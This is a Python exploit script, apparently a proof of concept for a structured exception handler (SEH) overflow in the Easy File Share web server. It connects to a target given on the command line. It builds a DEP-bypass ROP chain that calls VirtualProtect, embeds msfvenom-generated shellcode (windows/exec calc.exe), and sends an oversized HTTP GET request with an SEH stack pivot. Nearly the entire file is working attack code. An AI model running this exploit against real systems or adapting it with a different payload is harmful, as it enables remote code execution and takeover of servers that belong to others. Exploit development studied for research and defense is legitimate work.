# Easy File Share SEH Overflow

import socket
import sys
import struct

host = str(sys.argv[1])
port = int(sys.argv[2])

ip = sys.argv[1]

socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket.connect((ip,port))

def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_ebx:---]
      0x10015442,  # POP EAX # RETN [ImageLoad.dll]
      0xFFFFFDFF,  # '-201'
      0x100231d1,  # NEG EAX # RETN [ImageLoad.dll]
      0x1001da09,  # ADD EBX,EAX # MOV EAX,DWORD PTR SS:[ESP+C] # INC DWORD PTR DS:[EAX] # RETN [ImageLoad.dll]
      #[---INFO:gadgets_to_set_esi:---]
      0x10015442,  # POP EAX # RETN [ImageLoad.dll] 
      0x61c832d0,  # ptr to &VirtualProtect() [IAT sqlite3.dll]
      0x1001281a,  # ADD ESP,4 # RETN    ** [ImageLoad.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x61c735b4,  # &Writable location [sqlite3.dll]
      0x1002248c,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [ImageLoad.dll] 
      0x61c18d81,  # XCHG EAX,EDI # RETN [sqlite3.dll] 
      0x1001d626,  # XOR ESI,ESI # RETN [ImageLoad.dll] 
      0x10021a3e,  # ADD ESI,EDI # RETN 0x00 [ImageLoad.dll] 
      #[---INFO:gadgets_to_set_ebp:---]
      0x1001adb4,  # POP EBP # RETN [ImageLoad.dll] 
      0x61c24169,  # & push esp # ret  [sqlite3.dll]
      #[---INFO:gadgets_to_set_edx:---]
      0x10022c4c,  # XOR EDX,EDX # RETN [ImageLoad.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      #[---INFO:gadgets_to_set_ecx:---]
      0x1001b4f6,  # POP ECX # RETN [ImageLoad.dll] 
      0x61c7329d,  # &Writable location [sqlite3.dll]
      #[---INFO:gadgets_to_set_edi:---]
      0x61c373a4,  # POP EDI # RETN [sqlite3.dll] 
      0x1001a858,  # RETN (ROP NOP) [ImageLoad.dll]
      #[---INFO:gadgets_to_set_eax:---]
      0x10015442,  # POP EAX # RETN [ImageLoad.dll] 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x100240c2,  # PUSHAD # RETN [ImageLoad.dll] 
    ]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

#msfvenom -p windows/exec CMD=calc.exe -b "\x00\x20\x25\x2b\x2f\x3b" -f python

shellcode =  "\x81\xc4\x24\xfa\xff\xff"
shellcode += "\xd9\xe8\xd9\x74\x24\xf4\x58\xbe\xb1\xa4\x8a\x60\x31"
shellcode += "\xc9\xb1\x31\x31\x70\x18\x03\x70\x18\x83\xc0\xb5\x46"
shellcode += "\x7f\x9c\x5d\x04\x80\x5d\x9d\x69\x08\xb8\xac\xa9\x6e"
shellcode += "\xc8\x9e\x19\xe4\x9c\x12\xd1\xa8\x34\xa1\x97\x64\x3a"
shellcode += "\x02\x1d\x53\x75\x93\x0e\xa7\x14\x17\x4d\xf4\xf6\x26"
shellcode += "\x9e\x09\xf6\x6f\xc3\xe0\xaa\x38\x8f\x57\x5b\x4d\xc5"
shellcode += "\x6b\xd0\x1d\xcb\xeb\x05\xd5\xea\xda\x9b\x6e\xb5\xfc"
shellcode += "\x1a\xa3\xcd\xb4\x04\xa0\xe8\x0f\xbe\x12\x86\x91\x16"
shellcode += "\x6b\x67\x3d\x57\x44\x9a\x3f\x9f\x62\x45\x4a\xe9\x91"
shellcode += "\xf8\x4d\x2e\xe8\x26\xdb\xb5\x4a\xac\x7b\x12\x6b\x61"
shellcode += "\x1d\xd1\x67\xce\x69\xbd\x6b\xd1\xbe\xb5\x97\x5a\x41"
shellcode += "\x1a\x1e\x18\x66\xbe\x7b\xfa\x07\xe7\x21\xad\x38\xf7"
shellcode += "\x8a\x12\x9d\x73\x26\x46\xac\xd9\x2c\x99\x22\x64\x02"
shellcode += "\x99\x3c\x67\x32\xf2\x0d\xec\xdd\x85\x91\x27\x9a\x7a"
shellcode += "\xd8\x6a\x8a\x12\x85\xfe\x8f\x7e\x36\xd5\xd3\x86\xb5"
shellcode += "\xdc\xab\x7c\xa5\x94\xae\x39\x61\x44\xc2\x52\x04\x6a"
shellcode += "\x71\x52\x0d\x09\x14\xc0\xcd\xe0\xb3\x60\x77\xfd"


#buff = "A"*4061
buff = (0x985) * "A"
buff += create_rop_chain()
buff += "\x90" * 4
buff += shellcode #'\xcc\xcc\xcc\xcc'
buff += "B"*(4061 - len(buff))
buff += "CCCC" #NSEH
buff += "\x77\x28\x02\x10" #0x10022877 : {pivot 4100 / 0x1004} :  # ADD ESP,1004 # RETN    ** [ImageLoad.dll] **
buff += "D"*(4185-len(buff))
buff += "FFFF"
buff += "E"*(5000-len(buff))

print("Sending...")
socket.send("GET " + buff + " HTTP/1.0\r\n\r\n")

socket.close()
print("sent")
